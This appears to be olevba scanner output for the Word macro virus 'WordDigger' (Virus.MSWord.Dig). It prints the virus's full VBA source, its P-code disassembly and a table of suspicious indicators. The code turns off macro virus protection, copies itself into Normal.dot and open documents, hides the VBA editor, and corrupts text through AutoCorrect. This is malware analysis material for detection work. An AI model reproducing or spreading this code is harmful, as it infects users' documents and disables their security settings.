olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dig
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dig - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WordDigger.bas 
in file: Virus.MSWord.Dig - OLE stream: 'Macros/VBA/WordDigger'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const NStat = 0
Const VStat = 0
'Copyright © 1999 by dd!Actor.
'All rights reserved.
Public Declare Sub FatalAppExit Lib "kernel32" Alias "FatalAppExitA" (ByVal uAction As Long, ByVal lpMessageText As String)
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Dim pth As String, i As Byte, dc As Object
Dim NInst As Boolean, AInst As Boolean
On Error Resume Next
Application.VBE.MainWindow.Visible = False
pth = Environ("temp") & "\~WRD000^.tmp"
Set dc = NormalTemplate.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "WordDigger" Then
NInst = 1
dc(i).Export pth
End If
Next i
Set dc = ActiveDocument.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "WordDigger" Then
AInst = 1
dc(i).Export pth
End If
Next i
If AInst = True And NInst = False Then Set dc = NormalTemplate
If AInst = False And NInst = True Then Set dc = ActiveDocument
If AInst = False Or NInst = False Then
dc.VBProject.VBComponents.Import pth
If Mid(ActiveDocument.FullName, 2, 1) = ":" Then dc.Save
Kill pth
End If
If Hour(Time) = Minute(Time) Then
AutoCorrect.ReplaceText = True
AutoCorrect.Entries.Add ",", ", áëèí,"
MsgBox "Copyright © 1999 by dd!Actor." + vbCrLf + "All rights reserved.", vbOKOnly + vbInformation
End If
End Sub
Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Application.VBE.MainWindow.Visible = False
WordBasic.DisableAutoMacros 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
If Hour(Time) = Minute(Time) Then
AutoCorrect.ReplaceText = True
AutoCorrect.Entries.Add ",", ", áëèí,"
MsgBox "Copyright © 1999 by dd!Actor." + vbCrLf + "All rights reserved.", vbOKOnly + vbInformation
End If
End Sub
Sub FileSave()
On Error Resume Next
Call AutoOpen
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Call AutoOpen
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub ToolsOptions()
On Error Resume Next
Dim dc As Object
Dim VirStat As Byte
Dim NorStat As Byte
Options.SaveNormalPrompt = NStat
Options.VirusProtection = VStat
Dialogs(wdDialogToolsOptions).Show
Set dc = ActiveDocument.VBProject.VBComponents("WordDigger").CodeModule
If Options.SaveNormalPrompt = True Then NorStat = 1
If Options.VirusProtection = True Then VirStat = 1
dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat
Set dc = NormalTemplate.VBProject.VBComponents("WordDigger").CodeModule
dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat
Options.SaveNormalPrompt = 0
Options.VirusProtection = 0
NormalTemplate.Save
NormalTemplate.Saved = True
End Sub
Sub ToolsMacro()
Dim i As Byte, n As Integer, pth As String
Dim NInst As Boolean, AInst As Boolean, Nsav As Boolean, Asav As Boolean, res As Boolean
Dim dc As Object, dcN As Object, dcA As Object
On Error Resume Next
pth = Environ("temp") & "\~WRD000^.tmp"
Set dcN = NormalTemplate.VBProject.VBComponents
Set dcA = ActiveDocument.VBProject.VBComponents
Set dc = NormalTemplate.VBProject
GoSub 10
NInst = res
Set dc = ActiveDocument.VBProject
GoSub 10
AInst = res
If NInst = True Then
Set dc = dcN
GoSub 20
Nsav = NormalTemplate.Saved
NormalTemplate.Saved = 1
End If
If AInst = True Then
Set dc = dcA
GoSub 20
Asav = ActiveDocument.Saved
ActiveDocument.Saved = 1
End If
Dialogs(wdDialogToolsMacro).Show
dcN("WordDigger").CodeModule.AddFromFile pth
dcA("WordDigger").CodeModule.AddFromFile pth
dcN.CodeModule.AddFromFile pth
NormalTemplate.Saved = Nsav
dcA.CodeModule.AddFromFile pth
ActiveDocument.Saved = Asav
Kill pth
Exit Sub
10 For i = 1 To dc.VBComponents.Count
If dc.VBComponents(i).Name = "WordDigger" Then
res = 1
dc.VBComponents(i).Export pth
End If
Next i
Return
20 dc.Export pth
n = dc("WordDigger").CodeModule.CountOfLines
dc("WordDigger").CodeModule.DeleteLines 1, n
Return
End Sub
Sub ViewVBCode()
If Dir("c:\digger.die") = "" Then
FatalAppExit 0, "Ìîäóëü WinWord âûçâàë ôàòàëüíóþ îøèáêó âðè âûçîâå VBA! Code : dd!Actor"
Else
Application.VBE.MainWindow.Visible = True
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Dig
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/WordDigger - 8082 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	Dim (Const) 
' 	LitDI2 0x0000 
' 	VarDefn NStat
' Line #2:
' 	Dim (Const) 
' 	LitDI2 0x0000 
' 	VarDefn VStat
' Line #3:
' 	QuoteRem 0x0000 0x001D "Copyright © 1999 by dd!Actor."
' Line #4:
' 	QuoteRem 0x0000 0x0014 "All rights reserved."
' Line #5:
' 	FuncDefn (Public Declare Sub FatalAppExit Lib "kernel32" (ByVal uAction As Long, ByVal lpMessageText As String))
' Line #6:
' 	FuncDefn (Sub AutoOpen())
' Line #7:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #9:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	Dim 
' 	VarDefn pth (As String)
' 	VarDefn i (As Byte)
' 	VarDefn dc (As Object)
' Line #12:
' 	Dim 
' 	VarDefn NInst (As Boolean)
' 	VarDefn AInst (As Boolean)
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd MainWindow 
' 	MemSt Visible 
' Line #15:
' 	LitStr 0x0004 "temp"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000D "\~WRD000^.tmp"
' 	Concat 
' 	St pth 
' Line #16:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dc 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd Count 
' 	For 
' Line #18:
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "WordDigger"
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	St NInst 
' Line #20:
' 	Ld pth 
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dc 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd Count 
' 	For 
' Line #25:
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "WordDigger"
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0001 
' 	St AInst 
' Line #27:
' 	Ld pth 
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Ld AInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set dc 
' 	EndIf 
' Line #31:
' 	Ld AInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set dc 
' 	EndIf 
' Line #32:
' 	Ld AInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NInst 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #33:
' 	Ld pth 
' 	Ld dc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #34:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld dc 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #35:
' 	Ld pth 
' 	ArgsCall Kill 0x0001 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Ld Time 
' 	ArgsLd Hour 0x0001 
' 	Ld Time 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #38:
' 	LitVarSpecial (True)
' 	Ld AutoCorrect 
' 	MemSt ReplaceText 
' Line #39:
' 	LitStr 0x0001 ","
' 	LitStr 0x0007 ", áëèí,"
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #40:
' 	LitStr 0x001D "Copyright © 1999 by dd!Actor."
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0014 "All rights reserved."
' 	Add 
' 	Ld vbOKOnly 
' 	Ld vbInformation 
' 	Add 
' 	ArgsCall MsgBox 0x0002 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	EndSub 
' Line #43:
' 	FuncDefn (Sub AutoExec())
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #46:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd MainWindow 
' 	MemSt Visible 
' Line #47:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #48:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #49:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #50:
' 	Ld Time 
' 	ArgsLd Hour 0x0001 
' 	Ld Time 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #51:
' 	LitVarSpecial (True)
' 	Ld AutoCorrect 
' 	MemSt ReplaceText 
' Line #52:
' 	LitStr 0x0001 ","
' 	LitStr 0x0007 ", áëèí,"
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #53:
' 	LitStr 0x001D "Copyright © 1999 by dd!Actor."
' 	Ld vbCrLf 
' 	Add 
' 	LitStr 0x0014 "All rights reserved."
' 	Add 
' 	Ld vbOKOnly 
' 	Ld vbInformation 
' 	Add 
' 	ArgsCall MsgBox 0x0002 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndSub 
' Line #56:
' 	FuncDefn (Sub FileSave())
' Line #57:
' 	OnError (Resume Next) 
' Line #58:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #59:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Sub FileSaveAs())
' Line #62:
' 	OnError (Resume Next) 
' Line #63:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #64:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Sub ToolsOptions())
' Line #67:
' 	OnError (Resume Next) 
' Line #68:
' 	Dim 
' 	VarDefn dc (As Object)
' Line #69:
' 	Dim 
' 	VarDefn VirStat (As Byte)
' Line #70:
' 	Dim 
' 	VarDefn NorStat (As Byte)
' Line #71:
' 	Ld NStat 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #72:
' 	Ld VStat 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #73:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #74:
' 	SetStmt 
' 	LitStr 0x000A "WordDigger"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set dc 
' Line #75:
' 	Ld Options 
' 	MemLd SaveNormalPrompt 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St NorStat 
' 	EndIf 
' Line #76:
' 	Ld Options 
' 	MemLd VirusProtection 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St VirStat 
' 	EndIf 
' Line #77:
' 	LitDI2 0x0002 
' 	LitStr 0x000C "const NStat="
' 	Ld NorStat 
' 	Concat 
' 	Ld dc 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #78:
' 	LitDI2 0x0003 
' 	LitStr 0x000C "const VStat="
' 	Ld VirStat 
' 	Concat 
' 	Ld dc 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #79:
' 	SetStmt 
' 	LitStr 0x000A "WordDigger"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set dc 
' Line #80:
' 	LitDI2 0x0002 
' 	LitStr 0x000C "const NStat="
' 	Ld NorStat 
' 	Concat 
' 	Ld dc 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #81:
' 	LitDI2 0x0003 
' 	LitStr 0x000C "const VStat="
' 	Ld VirStat 
' 	Concat 
' 	Ld dc 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #82:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #83:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #84:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #85:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub ToolsMacro())
' Line #88:
' 	Dim 
' 	VarDefn i (As Byte)
' 	VarDefn n (As Integer)
' 	VarDefn pth (As String)
' Line #89:
' 	Dim 
' 	VarDefn NInst (As Boolean)
' 	VarDefn AInst (As Boolean)
' 	VarDefn Nsav (As Boolean)
' 	VarDefn Asav (As Boolean)
' 	VarDefn res (As Boolean)
' Line #90:
' 	Dim 
' 	VarDefn dc (As Object)
' 	VarDefn dcN (As Object)
' 	VarDefn dcA (As Object)
' Line #91:
' 	OnError (Resume Next) 
' Line #92:
' 	LitStr 0x0004 "temp"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000D "\~WRD000^.tmp"
' 	Concat 
' 	St pth 
' Line #93:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dcN 
' Line #94:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dcA 
' Line #95:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set dc 
' Line #96:
' 	GoSub 10 
' Line #97:
' 	Ld res 
' 	St NInst 
' Line #98:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set dc 
' Line #99:
' 	GoSub 10 
' Line #100:
' 	Ld res 
' 	St AInst 
' Line #101:
' 	Ld NInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #102:
' 	SetStmt 
' 	Ld dcN 
' 	Set dc 
' Line #103:
' 	GoSub 20 
' Line #104:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St Nsav 
' Line #105:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	Ld AInst 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #108:
' 	SetStmt 
' 	Ld dcA 
' 	Set dc 
' Line #109:
' 	GoSub 20 
' Line #110:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St Asav 
' Line #111:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #114:
' 	Ld pth 
' 	LitStr 0x000A "WordDigger"
' 	ArgsLd dcN 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #115:
' 	Ld pth 
' 	LitStr 0x000A "WordDigger"
' 	ArgsLd dcA 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #116:
' 	Ld pth 
' 	Ld dcN 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #117:
' 	Ld Nsav 
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #118:
' 	Ld pth 
' 	Ld dcA 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #119:
' 	Ld Asav 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #120:
' 	Ld pth 
' 	ArgsCall Kill 0x0001 
' Line #121:
' 	ExitSub 
' Line #122:
' 	LineNum 10 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #123:
' 	Ld i 
' 	Ld dc 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "WordDigger"
' 	Eq 
' 	IfBlock 
' Line #124:
' 	LitDI2 0x0001 
' 	St res 
' Line #125:
' 	Ld pth 
' 	Ld i 
' 	Ld dc 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #128:
' 	Return 
' Line #129:
' 	LineNum 20 
' 	Ld pth 
' 	Ld dc 
' 	ArgsMemCall Export 0x0001 
' Line #130:
' 	LitStr 0x000A "WordDigger"
' 	ArgsLd dc 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St n 
' Line #131:
' 	LitDI2 0x0001 
' 	Ld n 
' 	LitStr 0x000A "WordDigger"
' 	ArgsLd dc 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #132:
' 	Return 
' Line #133:
' 	EndSub 
' Line #134:
' 	FuncDefn (Sub ViewVBCode())
' Line #135:
' 	LitStr 0x000D "c:\digger.die"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #136:
' 	LitDI2 0x0000 
' 	LitStr 0x0046 "Ìîäóëü WinWord âûçâàë ôàòàëüíóþ îøèáêó âðè âûçîâå VBA! Code : dd!Actor"
' 	ArgsCall FatalAppExit 0x0002 
' Line #137:
' 	ElseBlock 
' Line #138:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd MainWindow 
' 	MemSt Visible 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	EndSub 
' Line #141:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

